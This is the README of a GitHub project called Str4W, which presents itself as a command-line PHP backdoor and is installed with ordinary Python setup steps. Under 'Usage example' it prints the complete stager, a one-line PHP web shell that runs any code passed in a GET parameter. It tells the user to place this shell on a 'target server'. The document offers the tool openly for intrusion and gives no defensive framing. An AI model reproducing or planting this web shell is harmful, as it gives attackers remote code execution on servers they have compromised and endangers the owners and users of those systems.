# Str4W
> A command line PHP backdoor with the simplest stager ever. 

It's a multi functional PHP backdoor (similar to Metasplot to some extent) that uses a very small stager to make powerful things.

![](header.png)

## Installation

This application has been developed with Python 3.7.9 (recommended).
Although, it should work with previous (and future probably) versions of python (> 3.6).

Windows:
   - `pip install -r requirements.txt` to install the required dependencies.
   - `python main.py` to run the application.
   
Linux:
   - `pip3 install -r requirements.txt` to install the required dependencies.
   - `python3 main.py` to run the application.

## Usage example

The CLI is pretty straightforward. The commands are documented, so the user can get a description by using `help <command>`.  
For a complete list of commands, please use `help`.  

Although the interface is kinda user-friendly, you have to place the stager onto the target server.  
Don't worry, it is as simple as placing a PHP file with the following code inside:  
`<?php eval($_GET['c']); ?>`.  
Easy as that. 

## Release History

* 1.0
    * First release!

## Meta

Zeta314 – [@Zeta314](https://github.com/Zeta314)

Distributed under the GPL3.0 license. See ``LICENSE`` for more information.

[https://github.com/Zeta314/Str4W](https://github.com/Zeta314/)

## Contributing

1. Fork it (<https://github.com/Zeta314/Str4W/fork>)
2. Create your feature branch (`git checkout -b feature/fooBar`)
3. Commit your changes (`git commit -am 'Add some fooBar'`)
4. Push to the branch (`git push origin feature/fooBar`)
5. Create a new Pull Request
